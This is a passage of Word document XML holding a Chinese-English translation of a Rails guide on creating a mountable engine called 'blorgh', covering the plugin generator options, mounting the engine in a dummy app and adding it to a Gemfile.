        <w:t xml:space="preserve"> 给创建器命令的生成的 engine 被认为是一个“完整插件”（full plugin），但是这个教程将会参考始终将它们仅仅参考为 “engine”。一个 engine *能够*是一个 plugin，一个 plugin *能够*是一个 engine。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54331CB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在本教程中将会创建一个名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“blorgh”</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 engine。这个 engine 将会提供给 博客功能给他的宿主程序，允许新文章和新评论被创建。在教程的开始部分，你将会单独的在 engine 自身内部工作，但是在后面的部分你将会看到怎样将它衔接（hook）到一个应用程序中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E265F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Engine 也可以与他们的宿主程序相互隔离。这里的意思是一个应用程序可以有一个由路由 helper 提供的 path 例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且其使用的 engine 也可以一样有一个（通过路由 helper 提供的）名叫 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>posts_path</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的 path，并且这两个不会冲突。基于此，controllers， models 和 table也是名称空间化的。在教程后面你将会看到怎样来使用它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536F60E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It’s important to keep in mind at all times that the application should </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>always</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> take precedence over its engines. An application is the object that has final say in what goes on in the universe (with the universe being the application’s environment) where the engine should only be enhancing it, rather than changing it drastically. 在任何时间都要注意应用程序应该*总是*优先于它的 engine 这很重要。一个应用程序是最终在 universe 中说明会发生什么的对象（这里的 universe 就是应用程序的环境）**这样 engine 应该是仅仅加强它而不是大幅度的改变它**。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72E4FDB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要查看其他的 engine 示范， check out </w:t>
      </w:r>
      <w:hyperlink r:id="rId993" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Devise</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> engine，或者 </w:t>
      </w:r>
      <w:hyperlink r:id="rId994" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Forem</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> forum 功能的 engine。这里还有 </w:t>
      </w:r>
      <w:hyperlink r:id="rId995" w:history="1">
        <w:r w:rsidRPr="004E5E0B">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>RefineryCMS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> CMS engine。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E55A9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最后，engine 离不开 James Adam， Piotr Sarnacki， Rails Core Team， and a number of other people。如果你看到他们，不要忘记说声感谢。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD17D9E"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2 创建一个 engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CCEEA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要创建一个基于 Rails 3.1的 engine，你需要运行 plugin 创建器并且传递 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--full</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--mountable</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 给它。要创建初始的“blorgh” engine 你将需要在终端中运行如下命令：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1FD68611" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DECC88D" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2032412623"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ rails plugin new blorgh --full --mountable</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03E2008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The </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--full</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> option tells the plugin generator that you want to create an engine (which is a mountable plugin, hence the option name), creating the basic directory structure of an engine by providing things such as the foundations of an </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> folder, as well a </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> file. This generator also provides a file at </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> which is identical in function to an application’s </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> file. </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>--full</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项告诉 plugin 创建器你想创建一个 engine（它是一个可挂载的 plugin，因为选项的名字），创建 engine 基本的目录结构提供了这些如基础的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件夹，以及 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件。这个创建器也提供了一个在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件它是与应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件的功能是一致的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103B50C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--mountable</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项告诉创建器去 挂载 engine 到在 engine 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的模拟（dummy）测试程序。它通过在 dummy 应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">文件中置入下面内容，文件在 engine的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>test/dummy/config/routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5F054AF5" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E95AC71" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1207138999"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>mount Blorgh::Engine, :at</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "blorgh"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69198606"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2.1 进入一个 Engine</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13377909"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2.1.1 Critical files 关键文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="522B147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在标识这个新 engine 的根目录中，居住着一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh.gemspec</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，当你在后面包含 engine 到应用程序中的时候，你将会添加这行到一个 Rails 应用程序的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="53275781" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="59BD6DBA" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1148128764"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>gem 'blorgh', :path</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "vendor/engines/blorgh"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2754CF0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通过指定它为一个在</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Gemfile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">中的 gem，Bundler 将会这样导入它，解析这个 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh.gemspec</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件并且 require 一个在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录中的叫做 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>lib/blorgh.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的文件。这个文件 require </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blorgh/engine.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
